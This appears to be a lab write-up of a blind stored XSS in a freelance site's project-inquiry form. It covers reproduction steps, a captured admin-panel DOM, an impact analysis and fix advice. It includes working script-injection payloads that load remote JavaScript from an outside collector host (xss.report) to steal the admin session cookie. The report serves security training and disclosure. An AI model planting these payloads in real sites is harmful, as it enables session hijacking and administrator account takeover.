Lab name : Blind XSS - Freelance Full-Stack Developer

# Title
Blind Cross-Site Scripting (XSS) via Project Inquiry Form Leading to Admin Panel Compromise

# Vulnerability Type
Blind Cross-Site Scripting (XSS) / Stored XSS

# Summary
The application is vulnerable to Blind Cross-Site Scripting (XSS) through the "Start your project" contact form. The application fails to properly sanitize or encode user-supplied input in fields such as `Full Name`, `Phone`, and `Message` before storing it in the database. When an administrator logs into the backend portal and views the submitted project inquiries (`/admin/inquiries.php`), the malicious JavaScript payload executes automatically in the administrator's browser context. This allows an attacker to execute arbitrary code within the privileged administrator session.

# Vulnerable Endpoint
- `https://freelance.pwnedbox.site/#contact` (Where the payload is submitted)
- `https://freelance.pwnedbox.site/admin/inquiries.php` (Where the payload executes in the admin panel)

# Vulnerable Parameter
- `Full name`
- `Phone`
- `Message`

# Steps to Reproduce
1. Navigate to the contact form on the main website: `https://freelance.pwnedbox.site/#contact`
2. Prepare an out-of-band XSS payload using a tool like `xss.report`.
3. In the **"Full Name"**, **"Phone"**, and **"Message"** fields, insert the following payload:  
    `"><scRipt sRc=https://xss.report/c/cyberbro></sCRipt>`
4. Fill in the remaining required fields (Email, Service Inquiry, Project Budget, etc.) with valid data and click the **"Send Project Inquiry →"** button.
5. Wait for the administrator to log in and view the inquiries dashboard.
6. Observe the out-of-band interaction on `xss.report`. The tool successfully captures the execution, recording the admin's `PHPSESSID` cookie, the URI (`/admin/inquiries.php`), and the Referrer, confirming the payload executed in the admin's browser.

# Payload Used 
`"><scRipt sRc=https://xss.report/c/cyberbro></sCRipt>`

# Proof of Concept
<img width="1920" height="1036" alt="1" src="https://github.com/user-attachments/assets/23250266-c387-4fe8-be86-0a6da0dab75d" />
<img width="1920" height="1034" alt="2" src="https://github.com/user-attachments/assets/9cd72f1c-70a7-4ff7-a0c6-86cd0e744a1b" />
<img width="1920" height="1043" alt="3" src="https://github.com/user-attachments/assets/a73bf1ae-16bf-49a5-8313-9f11499c0887" />

# Extracted DOM
```js
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="stylesheet" href="../assets/css/style.css"><link rel="stylesheet" href="../assets/css/admin.css"><title>Admin — YourName.dev</title></head><body class="admin-shell">
<aside class="sidebar"><a class="brand" href="../index.php">YourName<span>.dev</span></a><div class="side-user">Administrator</div><nav><a href="index.php">▦ Dashboard</a><a href="inquiries.php">✉ Inquiries</a><a href="../index.php">↗ Website</a><a href="logout.php">↪ Logout</a></nav></aside>
<div class="admin-main"><header class="admin-top"><span>Admin panel</span><a href="../index.php">View website ↗</a></header><div class="admin-content"><div class="page-head"><div><h1>Project inquiries</h1><p class="muted">Manage leads submitted through your website.</p></div></div>
<form class="filters" method="get"><input name="q" value="" placeholder="Search name, email or service"><select name="status"><option value="">All statuses</option><option value="new">New</option><option value="read">Read</option><option value="contacted">Contacted</option><option value="closed">Closed</option></select><button class="small-btn" type="submit">Filter</button></form>
<div class="admin-card"><div class="table-wrap"><table><thead><tr><th>Client</th><th>Service</th><th>Budget</th><th>Status</th><th>Submitted</th><th>Action</th></tr></thead><tbody>
<tr><td><strong>'"&gt;<script src="https://xss.report/c/cyberbro"></script></strong><small>hello@gmail.com</small></td><td>Business Websites</td><td>Under ₹25,000</td><td><span class="status new">New</span></td><td>22 Oct 2026, 03:45</td><td><a class="small-btn" href="inquiry.php?id=2">View</a></td></tr><tr><td><strong>'"&gt;<img src="" onerror="import('//xss.report/c/rix4uni')"></strong><small>ali@gmail.com</small></td><td>Business Websites</td><td>₹25,000 – ₹50,000</td><td><span class="status new">New</span></td><td>21 Oct 2026, 00:44</td><td><a class="small-btn" href="inquiry.php?id=1">View</a></td></tr></tbody></table></div></div>
</div></div><script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/vce701823e78c4301a35b7e07294d87301792088814092" integrity="sha512-UKNk8GbxkABxKcXYuLkO16EleLGUkcvJWtpSNmExE0Too3ZaFAxTscNWEc1OdAv5/BikHawapSCaiD2XCmp+Bw==" data-cf-beacon="{&quot;version&quot;:&quot;2024.11.0&quot;,&quot;token&quot;:&quot;534dbc1854e3437aa1164d09110b7f47&quot;,&quot;r&quot;:1,&quot;spa&quot;:2}" crossorigin="anonymous"></script>
</body></html>
```

# Impact
Because this is a Blind XSS, the payload executes in the browser of an internal user (specifically, the site administrator) when they view the infected inquiries. This is a critical vulnerability. An attacker can perform the following actions:

- **Session Hijacking & Admin Account Takeover:** Steal the administrator's session cookie (`PHPSESSID`), allowing the attacker to completely bypass authentication and take over the admin account.
- **Privileged Actions:** The script can make authenticated requests on behalf of the administrator to perform sensitive actions, such as altering site content, viewing sensitive customer data, or creating new admin users.
- **Exfiltration of Sensitive Data:** The payload can read the contents of the admin dashboard or internal pages and send them to an attacker-controlled server.

# Recommendation for fix
1. **Output Encoding:** Apply context-aware HTML entity encoding to **all** user-supplied data before rendering it in **any** interface, including backend administrative panels (e.g., convert `<` to `&lt;`, `>` to `&gt;`, `"` to `&quot;`). The backend must be treated with the same security rigor as the public-facing frontend.
2. **Input Sanitization:** Use a reputable HTML sanitization library (such as DOMPurify) to strip dangerous tags and attributes from user input before storing it in the database. If rich text is not required, strip all HTML tags entirely.
3. **Content Security Policy (CSP):** Deploy a strict CSP header on the administrative backend to prevent the execution of inline scripts and unauthorized external scripts as a defense-in-depth measure.
4. **Secure Cookies:** Ensure all session cookies (like `PHPSESSID`) use the `HttpOnly` and `Secure` flags to prevent JavaScript from accessing them, mitigating the risk of session hijacking even if an XSS occurs.
